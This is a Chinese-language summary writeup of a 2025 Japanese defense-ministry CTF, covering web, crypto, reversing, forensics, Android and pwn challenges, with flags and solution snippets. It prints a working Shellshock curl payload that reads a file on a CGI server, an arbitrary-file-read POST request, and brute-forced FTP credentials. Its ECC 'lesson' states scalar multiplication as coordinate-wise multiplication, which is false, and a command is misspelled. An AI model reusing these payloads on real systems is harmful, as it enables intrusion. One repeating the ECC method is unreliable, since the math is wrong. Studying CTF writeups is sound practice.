---
title: 防衛省サイバーコンテスト2025 Writeup供養
contest: 防衛省サイバーコンテスト
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [Web-HTML注释flag,JSON.php-base64数组,ECC椭圆曲线,Shellshock-CVE-2014-6271,FTP-pcap-密码爆破,Android-NDK-crackme,Brainfuck,vsFTPd-3.0.3,Android-APK,peakey-encode,emoji-steganography,pattern-XOR,ct-batch,cookie-deserialize]
attack_chain: WE-1: HTML注释 <!--flag{TakeMeToTheFlag}-->|WE-2: 石中剑(Stones)游戏|WE-3: download.php?fName=/etc/WE-3读文件 flag{fGrantUB56skBTlmF14mostFP}|WE-4: json.php POST data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0= base64+JSON array|CRYPTO: 椭圆曲线 a=56,b=58,p=127 基准点(42,67) 公开键(53,30)求私钥d|REVERSE-1: C语言质数计数 k=10000000 简单|REVERSE-2: Peakey Encode emoji隐写 flag{🚒,😤,🐈,😡,🙌,...}替换|REVERSE-3: Brainfuck代码|LOG: 192.168.100.106访问日志分析|FORENSIC: vsFTPd 3.0.3 密码爆破 agita:zyyzzyzy|MOBILE: Android NDK SecretGenerater.checkNative(str) 16字符比对 VUSTIq@H~]wGSBVH|PWN-1: Shellshock CVE-2014-6271 (){:;};echo;cat /etc/PW-1 flag{>:(!shellshock!}|PWN-4: Cat game PrintHeap/AllocateCat/Print/Free|ct batch: FDATA1-9生成flag{...}|pattern XOR: pattern1/2/3 XOR compare
key_payload: data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn1d|data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=|ECCScalarMult(G, d)=(Px, Py) G=(42,67) P=(53,30) a=56 b=58 p=127|cur -X POST -d "fName=/etc/WE-3" https://we3-prod.2025winter-cybercontest.net/secret/download.php|AAA^AAsAABAA$AAnAACAA-AAmeow(PE)|USER agita PASS zyyzzyzy|(){:;};echo Content-type: text/plain;echo;/bin/cat /etc/PW-1
one_liner: 防衛省サイバーコンテスト2025 Writeup供養多方向:HTML注释flag+石中剑+download.php读源+JSON base64数组+ECC椭圆曲线(a=56,b=58,p=127)求私钥+PeakeyEncode emoji隐写🚒😤🐈😡🙌+Brainfuck+vsFTPd密码爆破agita:zyyzzyzy+Android NDK SecretGenerater+Shellshock CVE-2014-6271+Cat game UAF+ct batch+pattern XOR
lesson: 1) HTML注释flag直接读<!--flag{...}-->; 2) JSON.php data base64 JSON数组: [{{name,value}},{name,flag,value,on}]; 3) ECC小素数暴力枚举:d in 1..p-1, kG=(d*42, d*67) mod p; 4) PeakeyEncode emoji替换:'>'→🚒 '<'→😭 '+'→😡 '-'→🙌 '.'→🌺 ','→✍️ '['→😤 ']'→🐈; 5) vsFTPd 3.0.3 密码爆破+USER agita枚举; 6) Android NDK SecretGenerater.decode(str).equals("VUSTIq@H~]wGSBVH") 16字符; 7) Shellshock CVE-2014-6271:(){:;};echo Content-type:text/plain;echo;/bin/cat /etc/PW-1
quality: high
---

## 备注

原文(https://www.ctfiot.com/226942.html)2025年冬季防衛省サイバーコンテスト(日本防卫省CTF),多方向多题,涵盖Web/Crypto/Re/Forensic/Mobile/Pwn。

### 题目清单

**WE-1** — HTML注释flag
```html
<!-- flag{TakeMeToTheFlag} -->
```

**WE-2** — 石中剑(图片)
**WE-3** — download.php读源
```bash
$ curl -X POST -d "fName=/etc/WE-3" https://we3-prod.2025winter-cybercontest.net/secret/download.php
flag{fGrantUB56skBTlmF14mostFP}
```

**WE-4** — json.php base64 JSON数组
```
data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn1d  # [{"name":"name","value":"on"}]
data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=  # [{"name":"name","value":"on"},{"name":"flag","value":"on"}]
```

**CRYPTO** — ECC小素数
- a=56, b=58, p=127
- 基准点G=(42,67)
- 公开键P=(53,30)
- 求私钥d:暴力枚举d in 1..p-1,kG=(d*42, d*67) mod p

**REVERSE-1** — C质数计数
```c
int i,j,k,l; int cnt = 0;
k = 10000000;
for(i=2;i<=k;++i){
    l=0;
    for(j=2;j...
```

**REVERSE-2** — PeakeyEncode emoji隐写
```ruby
generate = PeakeyEncode.new.generate(flag)
generate = generate.gsub(">", "🚒")
generate = generate.gsub("<", "😭")
generate = generate.gsub("+", "😡")
generate = generate.gsub("-", "🙌")
generate = generate.gsub(".", "🌺")
generate = generate.gsub(",", "✍️")
generate = generate.gsub("[", "😤")
generate = generate.gsub("]", "🐈")
```

**REVERSE-3** — Brainfuck
```
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.++++++.-----------.++++++.++++++++++++++++++++.--.----------.++++++.----------------------.++++++++++++.+++.+.++++++++.------------------------.+++.++++++++++++++++.-----------------.------------------------------------------------.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++.+
```

**LOG** — 访问日志
```
192.168.100.106 - - [11/Jul/2024:09:36:24 +0900] "GET /index.php HTTP/1.1" 200 424
192.168.100.106 - - [11/Jul/2024:09:36:29 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:36:30 +0900] "GET /ctf/fr1/index.php?msg=2 HTTP/1.1" 200 478
192.168.100.106 - - [11/Jul/2024:09:45:54 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:46:00 +0900] "GET /mypage.php?sesid=MTc2NzIyNTU5OSw2LHVzZXI2 HTTP/1.1" 200 281
```

**FORENSIC** — vsFTPd 3.0.3 密码爆破
```
220 (vsFTPd 3.0.3)
USER agita
331 Please specify the password.
PASS wwwww / yyyyyyyy / zyyzzyzy
230 Login successful.  # agita:zyyzzyzy
```

**MOBILE** — Android NDK SecretGenerater
```java
public class SecretGenerater {
    static { System.loadLibrary("insecureapp"); }
    public static native String checkNative(String paramString);
    public static String decode(String paramString) {
        paramString = checkNative(paramString);
        return (paramString.length() == 16) ? paramString : "";
    }
}
// VUSTIq@H~]wGSBVH (16字符)
```

**PWN-1** — Shellshock CVE-2014-6271
```bash
$ curl -A "() { :;}; echo Content-type: text/plain;echo;/bin/cat /etc/PW-1" https://pw1-prod.2025winter-cybercontest.net/cgi-bin/n.cgi
flag{>:(!shellshock!}
```

**PWN-4** — Cat game
```
1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

What does the cat say?
AAA^AAsAABAA$AAnAACAA-AAmeow
Congratulations!
flag{cat_g0es_me0w}
```

**ct batch** — 生成flag文件
```bat
set FDATA1=23
set FDATA2=61
set FDATA3=34
set FDATA4=25
...
for /l %%n in (10,1,99) do (
  type null > flags_%%n.txt
  echo flag{%FDATA5%%FDATA4%%%n%FDATA1%%FDATA6%%FDATA2%%%n%FDATA3%%FDATA7%%FDATA9%%FDATA8%} > flags_%%n.txt
  if %%n==%FDATA4% echo > flags_%%n.txt: TrueFlag
)
```

**pattern XOR** — pattern1/2/3 XOR compare
```python
"".join([chr(d1[i] ^ c[i]) for i in range(len(c))])
# 'find1\x05\x1b?4/'
"".join([chr(d2[i] ^ c[i]) for i in range(len(c))])
# 'ciBd*\x16z\x95SQ'
"".join([chr(d3[i] ^ c[i]) for i in range(len(c))])
# 'flag{¬\x1dïý}'
```

## 评级

- **quality: high** — 11+题多方向(日英双语),HTML注释+ECC+PeakeyEncode+Shellshock+vsFTPd爆破+Android NDK+ct batch+pattern XOR全套
- **vuln_type: web_unknown** — 主分类Web
- 实战价值:ECC小素数暴力+emoji隐写+Shellshock+Brainfuck逆向是2024-2025年CTF新兴套路
